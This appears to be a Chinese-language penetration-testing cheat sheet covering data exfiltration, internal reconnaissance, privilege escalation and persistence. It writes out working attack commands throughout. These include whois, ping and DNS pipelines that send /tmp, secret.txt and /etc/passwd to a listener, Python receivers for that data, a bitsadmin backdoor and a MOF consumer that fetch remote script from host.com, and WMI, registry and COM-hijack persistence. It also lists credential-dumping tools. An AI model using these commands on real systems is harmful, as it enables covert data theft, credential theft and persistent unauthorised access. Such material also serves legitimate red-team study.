<p><a href="https://twitter.com/mubix/status/1102780436118409216" target="_blank" rel="noopener">WHOIS + TAR</a><br>First:  </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ncat -k -l -p 4444 | tee files.b64  #tee to a file so you can make sure you have it</span><br></pre></td></tr></table></figure>

<p>Next</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">tar czf - /tmp/* | base64 | xargs -I bits timeout 0.03 whois -h host_ip -p 4444 bits</span><br></pre></td></tr></table></figure>

<p>Finally</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cat files.b64 | tr -d &apos;\r\n&apos; | base64 -d | tar zxv #to get the files out</span><br></pre></td></tr></table></figure>

<p>PING<br>发送端:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">xxd -p -c 4 secret.txt | while read line; do ping -c 1 -p $line ip; done</span><br></pre></td></tr></table></figure>
<p>接收端<code>ping_receiver.py</code>:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import sys</span><br><span class="line"></span><br><span class="line">try:</span><br><span class="line">    from scapy.all import *</span><br><span class="line">except:</span><br><span class="line">    print(&quot;Scapy not found, please install scapy: pip install scapy&quot;)</span><br><span class="line">    sys.exit(0)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def process_packet(pkt):</span><br><span class="line">    if pkt.haslayer(ICMP):</span><br><span class="line">        if pkt[ICMP].type == 8:</span><br><span class="line">            data = pkt[ICMP].load[-4:]</span><br><span class="line">            print(f&apos;&#123;data.decode(&quot;utf-8&quot;)&#125;&apos;, flush=True, end=&quot;&quot;, sep=&quot;&quot;)</span><br><span class="line"></span><br><span class="line">sniff(iface=&quot;eth0&quot;, prn=process_packet)</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python3 ping_receiver.py</span><br></pre></td></tr></table></figure>

<p>DIG<br>发送端:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">xxd -p -c 31 /etc/passwd | while read line; do dig @172.16.1.100 +short +tries=1 +time=1 $line.gooogle.com; done</span><br></pre></td></tr></table></figure>
<p>接收端<code>dns_reciver.py</code>:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">try:</span><br><span class="line">    from scapy.all import *</span><br><span class="line">except:</span><br><span class="line">    print(&quot;Scapy not found, please install scapy: pip install scapy&quot;)</span><br><span class="line"></span><br><span class="line">def process_packet(pkt):</span><br><span class="line">    if pkt.haslayer(DNS):</span><br><span class="line">        domain = pkt[DNS][DNSQR].qname.decode(&apos;utf-8&apos;)</span><br><span class="line">        root_domain = domain.split(&apos;.&apos;)[1]</span><br><span class="line">        if root_domain.startswith(&apos;gooogle&apos;):</span><br><span class="line">            print(f&apos;&#123;bytearray.fromhex(domain[:-13]).decode(&quot;utf-8&quot;)&#125;&apos;, flush=True, end=&apos;&apos;)</span><br><span class="line"></span><br><span class="line">sniff(iface=&quot;eth0&quot;, prn=process_packet)</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python3 dns_reciver.py</span><br></pre></td></tr></table></figure>
<p>… </p>
<h3 id="搭建-HTTP-server"><a href="#搭建-HTTP-server" class="headerlink" title="搭建 HTTP server"></a>搭建 HTTP server</h3><p>python2</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python -m SimpleHTTPServer 1337</span><br></pre></td></tr></table></figure>
<p>python3</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python -m http.server 1337</span><br></pre></td></tr></table></figure>
<p>PHP 5.4+</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">php -S 0.0.0.0:1337</span><br></pre></td></tr></table></figure>
<p>ruby</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ruby -rwebrick -e&apos;WEBrick::HTTPServer.new(:Port =&gt; 1337, :DocumentRoot =&gt; Dir.pwd).start&apos;</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ruby -run -e httpd . -p 1337</span><br></pre></td></tr></table></figure>
<p>Perl</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">perl -MHTTP::Server::Brick -e &apos;$s=HTTP::Server::Brick-&gt;new(port=&gt;1337); $s-&gt;mount(&quot;/&quot;=&gt;&#123;path=&gt;&quot;.&quot;&#125;); $s-&gt;start&apos;</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">perl -MIO::All -e &apos;io(&quot;:8080&quot;)-&gt;fork-&gt;accept-&gt;(sub &#123; $_[0] &lt; io(-x $1 +? &quot;./$1 |&quot; : $1) if /^GET \/(.*) / &#125;)&apos;</span><br></pre></td></tr></table></figure>
<p>busybox httpd</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">busybox httpd -f -p 8000</span><br></pre></td></tr></table></figure>



<h2 id="内网信息搜集"><a href="#内网信息搜集" class="headerlink" title="内网信息搜集"></a>内网信息搜集</h2><h3 id="本机信息搜集"><a href="#本机信息搜集" class="headerlink" title="本机信息搜集"></a>本机信息搜集</h3><h4 id="1、用户列表"><a href="#1、用户列表" class="headerlink" title="1、用户列表"></a>1、用户列表</h4><p>windows用户列表<br>分析邮件用户，内网[域]邮件用户，通常就是内网[域]用户 </p>
<h4 id="2、进程列表"><a href="#2、进程列表" class="headerlink" title="2、进程列表"></a>2、进程列表</h4><p>析杀毒软件/安全监控工具等<br>邮件客户端<br>VPN<br>ftp等  </p>
<h4 id="3、服务列表"><a href="#3、服务列表" class="headerlink" title="3、服务列表"></a>3、服务列表</h4><p>与安全防范工具有关服务[判断是否可以手动开关等]<br>存在问题的服务[权限/漏洞]</p>
<h4 id="4、端口列表"><a href="#4、端口列表" class="headerlink" title="4、端口列表"></a>4、端口列表</h4><p>开放端口对应的常见服务/应用程序[匿名/权限/漏洞等]<br>利用端口进行信息收集</p>
<h4 id="5、补丁列表"><a href="#5、补丁列表" class="headerlink" title="5、补丁列表"></a>5、补丁列表</h4><p>分析 Windows 补丁<br>第三方软件[Java/Oracle/Flash 等]漏洞</p>
<h4 id="6、本机共享"><a href="#6、本机共享" class="headerlink" title="6、本机共享"></a>6、本机共享</h4><p>本机共享列表/访问权限<br>本机访问的域共享/访问权限</p>
<h4 id="7、本用户习惯分析"><a href="#7、本用户习惯分析" class="headerlink" title="7、本用户习惯分析"></a>7、本用户习惯分析</h4><p>历史记录<br>收藏夹<br>文档等 </p>
<h4 id="8、获取当前用户密码工具"><a href="#8、获取当前用户密码工具" class="headerlink" title="8、获取当前用户密码工具"></a>8、获取当前用户密码工具</h4><h5 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h5><ul>
<li><a href="https://github.com/gentilkiwi/mimikatz" target="_blank" rel="noopener">mimikatz</a>  </li>
<li><a href="https://github.com/vergl4s/pentesting-dump/tree/master/net/Windows/wce_v1_42beta_x64" target="_blank" rel="noopener">wce</a>  </li>
<li><a href="https://github.com/peewpw/Invoke-WCMDump" target="_blank" rel="noopener">Invoke-WCMDump  </a></li>
<li><a href="https://github.com/giMini/mimiDbg" target="_blank" rel="noopener">mimiDbg  </a></li>
<li><a href="https://github.com/AlessandroZ/LaZagne" target="_blank" rel="noopener">LaZagne</a></li>
<li><a href="http://launcher.nirsoft.net/downloads/" target="_blank" rel="noopener">nirsoft_package</a></li>
<li><a href="https://github.com/quarkslab/quarkspwdump" target="_blank" rel="noopener">QuarksPwDump</a> <a href="https://github.com/mcandre/fgdump" target="_blank" rel="noopener">fgdump</a></li>
<li>星号查看器等</li>
</ul>
<h5 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h5><ul>
<li><a href="https://github.com/AlessandroZ/LaZagne" target="_blank" rel="noopener">LaZagne</a>  </li>
<li><a href="https://github.com/huntergregal/mimipenguin" target="_blank" rel="noopener">mimipenguin</a></li>
</ul>
<h3 id="扩散信息收集"><a href="#扩散信息收集" class="headerlink" title="扩散信息收集"></a>扩散信息收集</h3><h4 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h4><h5 id="常用端口扫描工具"><a href="#常用端口扫描工具" class="headerlink" title="常用端口扫描工具"></a>常用端口扫描工具</h5><ul>
<li><a href="https://nmap.org/" target="_blank" rel="noopener">nmap</a> </li>
<li><a href="https://github.com/robertdavidgraham/masscan" target="_blank" rel="noopener">masscan</a> </li>
<li><a href="https://github.com/zmap/zmap" target="_blank" rel="noopener">zmap</a></li>
<li>s扫描器 </li>
<li>自写脚本等 </li>
<li>NC </li>
<li>…</li>
</ul>
<h4 id="内网拓扑架构分析"><a href="#内网拓扑架构分析" class="headerlink" title="内网拓扑架构分析"></a>内网拓扑架构分析</h4><ul>
<li>DMZ</li>
<li>管理网</li>
<li>生产网</li>
<li>测试网</li>
</ul>
<h4 id="常见信息收集命令"><a href="#常见信息收集命令" class="headerlink" title="常见信息收集命令"></a>常见信息收集命令</h4><p>ipconfig:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ipconfig /all ------&gt; 查询本机 IP 段，所在域等</span><br></pre></td></tr></table></figure>
<p>net:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">net user ------&gt; 本机用户列表</span><br><span class="line">net localgroup administrators ------&gt; 本机管理员[通常含有域用户]</span><br><span class="line">net user /domain ------&gt; 查询域用户</span><br><span class="line">net group /domain ------&gt; 查询域里面的工作组</span><br><span class="line">net group &quot;domain admins&quot; /domain ------&gt; 查询域管理员用户组</span><br><span class="line">net localgroup administrators /domain ------&gt; 登录本机的域管理员</span><br><span class="line">net localgroup administrators workgroup\user001 /add -----&gt;域用户添加到本机 net group &quot;Domain controllers&quot; -------&gt; 查看域控制器(如果有多台)</span><br><span class="line">net view ------&gt; 查询同一域内机器列表 net view /domain ------&gt; 查询域列表</span><br><span class="line">net view /domain:domainname</span><br></pre></td></tr></table></figure>
<p>dsquery </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">dsquery computer domainroot -limit 65535 &amp;&amp; net group &quot;domain</span><br><span class="line">computers&quot; /domain ------&gt; 列出该域内所有机器名</span><br><span class="line">dsquery user domainroot -limit 65535 &amp;&amp; net user /domain------&gt;列出该域内所有用户名</span><br><span class="line">dsquery subnet ------&gt;列出该域内网段划分</span><br><span class="line">dsquery group &amp;&amp; net group /domain ------&gt;列出该域内分组 </span><br><span class="line">dsquery ou ------&gt;列出该域内组织单位 </span><br><span class="line">dsquery server &amp;&amp; net time /domain------&gt;列出该域内域控制器</span><br></pre></td></tr></table></figure>

<h3 id="第三方信息收集"><a href="#第三方信息收集" class="headerlink" title="第三方信息收集"></a>第三方信息收集</h3><ul>
<li>NETBIOS 信息收集 </li>
<li>SMB 信息收集  </li>
<li>空会话信息收集  </li>
<li>漏洞信息收集等 </li>
</ul>
<h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><h3 id="Windows-1"><a href="#Windows-1" class="headerlink" title="Windows"></a>Windows</h3><h4 id="BypassUAC"><a href="#BypassUAC" class="headerlink" title="BypassUAC"></a>BypassUAC</h4><h5 id="常用方法"><a href="#常用方法" class="headerlink" title="常用方法"></a>常用方法</h5><ul>
<li>使用IFileOperation COM接口</li>
<li>使用Wusa.exe的extract选项</li>
<li>远程注入SHELLCODE 到傀儡进程</li>
<li>DLL劫持，劫持系统的DLL文件</li>
<li>eventvwr.exe and registry hijacking</li>
<li>sdclt.exe</li>
<li>SilentCleanup</li>
<li>wscript.exe</li>
<li>cmstp.exe</li>
<li>修改环境变量，劫持高权限.Net程序</li>
<li>修改注册表HKCU\Software\Classes\CLSID，劫持高权限程序</li>
<li>直接提权过UAC</li>
</ul>
<h5 id="常用工具"><a href="#常用工具" class="headerlink" title="常用工具"></a>常用工具</h5><ul>
<li><a href="https://github.com/hfiref0x/UACME" target="_blank" rel="noopener">UACME </a></li>
<li><a href="https://github.com/FuzzySecurity/PowerShell-Suite/tree/master/Bypass-UAC" target="_blank" rel="noopener">Bypass-UAC </a></li>
<li><a href="https://github.com/FuzzySecurity/PowerShell-Suite/tree/master/Bypass-UAC/Yamabiko" target="_blank" rel="noopener">Yamabiko </a></li>
<li>… </li>
</ul>
<h4 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h4><ul>
<li><p>windows内核漏洞提权</p>
<blockquote>
<p>检测类:<a href="https://github.com/GDSSecurity/Windows-Exploit-Suggester" target="_blank" rel="noopener">Windows-Exploit-Suggester</a>,<a href="https://github.com/brianwrf/WinSystemHelper" target="_blank" rel="noopener">WinSystemHelper</a>,<a href="https://github.com/bitsadmin/wesng" target="_blank" rel="noopener">wesng</a><br>利用类:<a href="https://github.com/SecWiki/windows-kernel-exploits" target="_blank" rel="noopener">windows-kernel-exploits</a>，<a href="https://github.com/AlessandroZ/BeRoot.git" target="_blank" rel="noopener">BeRoot</a></p>
</blockquote>
</li>
<li><p>服务提权 </p>
<blockquote>
<p>数据库服务，ftp服务等</p>
</blockquote>
</li>
<li><p>WINDOWS错误系统配置 </p>
</li>
<li><p>系统服务的错误权限配置漏洞 </p>
</li>
<li><p>不安全的注册表权限配置 </p>
</li>
<li><p>不安全的文件/文件夹权限配置 </p>
</li>
<li><p>计划任务 </p>
</li>
<li><p>任意用户以NT AUTHORITY\SYSTEM权限安装msi </p>
</li>
<li><p>提权脚本 </p>
<blockquote>
<p><a href="https://github.com/HarmJ0y/PowerUp/blob/master/PowerUp.ps1" target="_blank" rel="noopener">PowerUP</a>,<a href="https://github.com/rsmudge/ElevateKit" target="_blank" rel="noopener">ElevateKit</a></p>
</blockquote>
</li>
</ul>
<h3 id="Linux-1"><a href="#Linux-1" class="headerlink" title="Linux"></a>Linux</h3><h4 id="内核溢出提权"><a href="#内核溢出提权" class="headerlink" title="内核溢出提权"></a>内核溢出提权</h4><p><a href="https://github.com/SecWiki/linux-kernel-exploits" target="_blank" rel="noopener">linux-kernel-exploits </a></p>
<h4 id="计划任务"><a href="#计划任务" class="headerlink" title="计划任务"></a>计划任务</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">crontab -l</span><br><span class="line">ls -alh /var/spool/cron</span><br><span class="line">ls -al /etc/ | grep cron</span><br><span class="line">ls -al /etc/cron*</span><br><span class="line">cat /etc/cron*</span><br><span class="line">cat /etc/at.allow</span><br><span class="line">cat /etc/at.deny</span><br><span class="line">cat /etc/cron.allow</span><br><span class="line">cat /etc/cron.deny</span><br><span class="line">cat /etc/crontab</span><br><span class="line">cat /etc/anacrontab</span><br><span class="line">cat /var/spool/cron/crontabs/root</span><br></pre></td></tr></table></figure>
<h4 id="SUID"><a href="#SUID" class="headerlink" title="SUID"></a>SUID</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">find / -user root -perm -4000 -print 2&gt;/dev/null</span><br><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br><span class="line">find / -user root -perm -4000 -exec ls -ldb &#123;&#125; \;</span><br></pre></td></tr></table></figure>
<h4 id="系统服务的错误权限配置漏洞"><a href="#系统服务的错误权限配置漏洞" class="headerlink" title="系统服务的错误权限配置漏洞"></a>系统服务的错误权限配置漏洞</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cat /var/apache2/config.inc</span><br><span class="line">cat /var/lib/mysql/mysql/user.MYD</span><br><span class="line">cat /root/anaconda-ks.cfg</span><br></pre></td></tr></table></figure>

<h4 id="不安全的文件-文件夹权限配置"><a href="#不安全的文件-文件夹权限配置" class="headerlink" title="不安全的文件/文件夹权限配置"></a>不安全的文件/文件夹权限配置</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cat ~/.bash_history</span><br><span class="line">cat ~/.nano_history</span><br><span class="line">cat ~/.atftp_history</span><br><span class="line">cat ~/.mysql_history</span><br><span class="line">cat ~/.php_history</span><br></pre></td></tr></table></figure>
<h4 id="找存储的明文用户名，密码"><a href="#找存储的明文用户名，密码" class="headerlink" title="找存储的明文用户名，密码"></a>找存储的明文用户名，密码</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">grep -i user [filename]</span><br><span class="line">grep -i pass [filename]</span><br><span class="line">grep -C 5 &quot;password&quot; [filename]</span><br><span class="line">find . -name &quot;*.php&quot; -print0 | xargs -0 grep -i -n &quot;var $password&quot; # Joomla</span><br></pre></td></tr></table></figure>

<h2 id="权限维持"><a href="#权限维持" class="headerlink" title="权限维持"></a>权限维持</h2><h3 id="系统后门"><a href="#系统后门" class="headerlink" title="系统后门"></a>系统后门</h3><h4 id="Windows-2"><a href="#Windows-2" class="headerlink" title="Windows"></a>Windows</h4><h5 id="1、密码记录工具"><a href="#1、密码记录工具" class="headerlink" title="1、密码记录工具"></a>1、密码记录工具</h5><p>WinlogonHack<br>WinlogonHack 是一款用来劫取远程3389登录密码的工具，在 WinlogonHack 之前有 一个 Gina 木马主要用来截取 Windows 2000下的密码，WinlogonHack 主要用于截 取 Windows XP 以及 Windows 2003 Server。<br>键盘记录器<br>安装键盘记录的目地不光是记录本机密码，是记录管理员一切的密码，比如说信箱，WEB 网页密码等等，这样也可以得到管理员的很多信息。<br>NTPass<br>获取管理员口令,一般用 gina 方式来,但有些机器上安装了 pcanywhere 等软件，会导致远程登录的时候出现故障，本软件可实现无障碍截取口令。<br>Linux 下 openssh 后门<br>重新编译运行的sshd服务，用于记录用户的登陆密码。</p>
<h5 id="2、常用的存储Payload位置"><a href="#2、常用的存储Payload位置" class="headerlink" title="2、常用的存储Payload位置"></a>2、常用的存储Payload位置</h5><p><strong>WMI</strong> :<br>存储：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$StaticClass = New-Object Management.ManagementClass(&apos;root\cimv2&apos;, $null,$null)</span><br><span class="line">$StaticClass.Name = &apos;Win32_Command&apos;</span><br><span class="line">$StaticClass.Put()</span><br><span class="line">$StaticClass.Properties.Add(&apos;Command&apos; , $Payload)</span><br><span class="line">$StaticClass.Put()</span><br></pre></td></tr></table></figure>
<p>读取:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$Payload=([WmiClass] &apos;Win32_Command&apos;).Properties[&apos;Command&apos;].Value</span><br></pre></td></tr></table></figure>

<p><strong>包含数字签名的PE文件</strong><br>利用文件hash的算法缺陷，向PE文件中隐藏Payload，同时不影响该PE文件的数字签名<br><strong>特殊ADS</strong><br>…</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">type putty.exe &gt; ...:putty.exe</span><br><span class="line">wmic process call create c:\test\ads\...:putty.exe</span><br></pre></td></tr></table></figure>
<p>特殊COM文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">type putty.exe &gt; \\.\C:\test\ads\COM1:putty.exe</span><br><span class="line">wmic process call create \\.\C:\test\ads\COM1:putty.exe</span><br></pre></td></tr></table></figure>
<p>磁盘根目录</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">type putty.exe &gt;C:\:putty.exe </span><br><span class="line">wmic process call create C:\:putty.exe</span><br></pre></td></tr></table></figure>
<h5 id="3、Run-RunOnce-Keys"><a href="#3、Run-RunOnce-Keys" class="headerlink" title="3、Run/RunOnce Keys"></a>3、Run/RunOnce Keys</h5><p>用户级 </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run</span><br><span class="line">HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce</span><br></pre></td></tr></table></figure>
<p>管理员 </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run</span><br><span class="line">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce</span><br><span class="line">HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run</span><br></pre></td></tr></table></figure>
<h5 id="4、BootExecute-Key"><a href="#4、BootExecute-Key" class="headerlink" title="4、BootExecute Key"></a>4、BootExecute Key</h5><p>由于smss.exe在Windows子系统加载之前启动，因此会调用配置子系统来加载当前的配置单元，具体注册表键值为：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">HKLM\SYSTEM\CurrentControlSet\Control\hivelist</span><br><span class="line">HKEY_LOCAL_MACHINE\SYSTEM\ControlSet002\Control\Session Manager</span><br></pre></td></tr></table></figure>
<h5 id="5、Userinit-Key"><a href="#5、Userinit-Key" class="headerlink" title="5、Userinit Key"></a>5、Userinit Key</h5><p>WinLogon进程加载的login scripts,具体键值：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon</span><br></pre></td></tr></table></figure>
<h5 id="6、Startup-Keys"><a href="#6、Startup-Keys" class="headerlink" title="6、Startup Keys"></a>6、Startup Keys</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders</span><br><span class="line">HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders</span><br><span class="line">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders</span><br><span class="line">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders</span><br></pre></td></tr></table></figure>
<h5 id="7、Services"><a href="#7、Services" class="headerlink" title="7、Services"></a>7、Services</h5><p>创建服务 </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sc create [ServerName] binPath= BinaryPathName</span><br></pre></td></tr></table></figure>
<h5 id="8、Browser-Helper-Objects"><a href="#8、Browser-Helper-Objects" class="headerlink" title="8、Browser Helper Objects"></a>8、Browser Helper Objects</h5><p>本质上是Internet Explorer启动时加载的DLL模块</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects</span><br></pre></td></tr></table></figure>
<h5 id="9、AppInit-DLLs"><a href="#9、AppInit-DLLs" class="headerlink" title="9、AppInit_DLLs"></a>9、AppInit_DLLs</h5><p>加载User32.dll会加载的DLL</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows\AppInit_DLLs</span><br></pre></td></tr></table></figure>
<h5 id="10、文件关联"><a href="#10、文件关联" class="headerlink" title="10、文件关联"></a>10、文件关联</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">HKEY_LOCAL_MACHINE\Software\Classes</span><br><span class="line">HKEY_CLASSES_ROOT</span><br></pre></td></tr></table></figure>
<h5 id="11、bitsadmin"><a href="#11、bitsadmin" class="headerlink" title="11、bitsadmin"></a>11、<a href="http://www.liuhaihua.cn/archives/357579.html" target="_blank" rel="noopener">bitsadmin</a></h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bitsadmin /create backdoor</span><br><span class="line">bitsadmin /addfile backdoor %comspec% %temp%\cmd.exe</span><br><span class="line">bitsadmin.exe /SetNotifyCmdLine backdoor regsvr32.exe &quot;/u /s /i:https://host.com/calc.sct scrobj.dll&quot;</span><br><span class="line">bitsadmin /Resume backdoor</span><br></pre></td></tr></table></figure>
<h5 id="12、mof"><a href="#12、mof" class="headerlink" title="12、mof "></a>12、<a href="https://evi1cg.me/archives/Powershell_MOF_Backdoor.html" target="_blank" rel="noopener">mof </a></h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pragma namespace(&quot;\\\\.\\root\\subscription&quot;) </span><br><span class="line">instance of __EventFilter as $EventFilter</span><br><span class="line">&#123;</span><br><span class="line">EventNamespace = &quot;Root\\Cimv2&quot;;</span><br><span class="line">Name = &quot;filtP1&quot;;</span><br><span class="line">Query = &quot;Select * From __InstanceModificationEvent &quot;</span><br><span class="line">&quot;Where TargetInstance Isa \&quot;Win32_LocalTime\&quot; &quot;</span><br><span class="line">&quot;And TargetInstance.Second = 1&quot;;</span><br><span class="line">QueryLanguage = &quot;WQL&quot;;</span><br><span class="line">&#125;; </span><br><span class="line">instance of ActiveScriptEventConsumer as $Consumer</span><br><span class="line">&#123;</span><br><span class="line">Name = &quot;consP1&quot;;</span><br><span class="line">ScriptingEngine = &quot;JScript&quot;;</span><br><span class="line">ScriptText = &quot;GetObject(\&quot;script:https://host.com/test\&quot;)&quot;;</span><br><span class="line">&#125;; </span><br><span class="line">instance of __FilterToConsumerBinding</span><br><span class="line">&#123;</span><br><span class="line">Consumer = $Consumer;</span><br><span class="line">Filter = $EventFilter;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>管理员执行：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mofcomp test.mof</span><br></pre></td></tr></table></figure>
<h5 id="13、wmi"><a href="#13、wmi" class="headerlink" title="13、wmi"></a>13、<a href="https://3gstudent.github.io/3gstudent.github.io/Study-Notes-of-WMI-Persistence-using-wmic.exe/" target="_blank" rel="noopener">wmi</a></h5><p>每隔60秒执行一次notepad.exe</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wmic /NAMESPACE:&quot;\\root\subscription&quot; PATH __EventFilter CREATE Name=&quot;BotFilter82&quot;, EventNameSpace=&quot;root\cimv2&quot;,QueryLanguage=&quot;WQL&quot;, Query=&quot;SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA &apos;Win32_PerfFormattedData_PerfOS_System&apos;&quot;</span><br><span class="line">wmic /NAMESPACE:&quot;\\root\subscription&quot; PATH CommandLineEventConsumer CREATE Name=&quot;BotConsumer23&quot;, ExecutablePath=&quot;C:\Windows\System32\notepad.exe&quot;,CommandLineTemplate=&quot;C:\Windows\System32\notepad.exe&quot;</span><br><span class="line">wmic /NAMESPACE:&quot;\\root\subscription&quot; PATH __FilterToConsumerBinding CREATE Filter=&quot;__EventFilter.Name=\&quot;BotFilter82\&quot;&quot;, Consumer=&quot;CommandLineEventConsumer.Name=\&quot;BotConsumer23\&quot;&quot;</span><br></pre></td></tr></table></figure>
<h5 id="14、Userland-Persistence-With-Scheduled-Tasks"><a href="#14、Userland-Persistence-With-Scheduled-Tasks" class="headerlink" title="14、Userland Persistence With Scheduled Tasks"></a>14、<a href="https://3gstudent.github.io/3gstudent.github.io/Userland-registry-hijacking/" target="_blank" rel="noopener">Userland Persistence With Scheduled Tasks</a></h5><p>劫持计划任务UserTask，在系统启动时加载dll</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function Invoke-ScheduledTaskComHandlerUserTask</span><br><span class="line">&#123;</span><br><span class="line">[CmdletBinding(SupportsShouldProcess = $True, ConfirmImpact = &apos;Medium&apos;)]</span><br><span class="line">Param (</span><br><span class="line">[Parameter(Mandatory = $True)]</span><br><span class="line">[ValidateNotNullOrEmpty()]</span><br><span class="line">[String]</span><br><span class="line">$Command,</span><br><span class="line"></span><br><span class="line">[Switch]</span><br><span class="line">$Force</span><br><span class="line">)</span><br><span class="line">$ScheduledTaskCommandPath = &quot;HKCU:\Software\Classes\CLSID\&#123;58fb76b9-ac85-4e55-ac04-427593b1d060&#125;\InprocServer32&quot;</span><br><span class="line">if ($Force -or ((Get-ItemProperty -Path $ScheduledTaskCommandPath -Name &apos;(default)&apos; -ErrorAction SilentlyContinue) -eq $null))&#123;</span><br><span class="line">New-Item $ScheduledTaskCommandPath -Force |</span><br><span class="line">New-ItemProperty -Name &apos;(Default)&apos; -Value $Command -PropertyType string -Force | Out-Null</span><br><span class="line">&#125;else&#123;</span><br><span class="line">Write-Verbose &quot;Key already exists, consider using -Force&quot;</span><br><span class="line">exit</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if (Test-Path $ScheduledTaskCommandPath) &#123;</span><br><span class="line">Write-Verbose &quot;Created registry entries to hijack the UserTask&quot;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">Write-Warning &quot;Failed to create registry key, exiting&quot;</span><br><span class="line">exit</span><br><span class="line">&#125; </span><br><span class="line">&#125;</span><br><span class="line">Invoke-ScheduledTaskComHandlerUserTask -Command &quot;C:\test\testmsg.dll&quot; -Verbose</span><br></pre></td></tr></table></figure>
<h5 id="15、Netsh"><a href="#15、Netsh" class="headerlink" title="15、Netsh"></a>15、<a href="https://3gstudent.github.io/3gstudent.github.io/Netsh-persistence/" target="_blank" rel="noopener">Netsh</a></h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">netsh add helper c:\test\netshtest.dll</span><br></pre></td></tr></table></figure>
<p>后门触发：每次调用netsh</p>
<blockquote>
<p>dll编写:<a href="https://github.com/outflanknl/NetshHelperBeacon" target="_blank" rel="noopener">https://github.com/outflanknl/NetshHelperBeacon</a></p>
</blockquote>
<h5 id="16、Shim"><a href="#16、Shim" class="headerlink" title="16、Shim"></a>16、<a href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84Application-Compatibility-Shims/" target="_blank" rel="noopener">Shim</a></h5><p>常用方式：<br>InjectDll<br>RedirectShortcut<br>RedirectEXE</p>
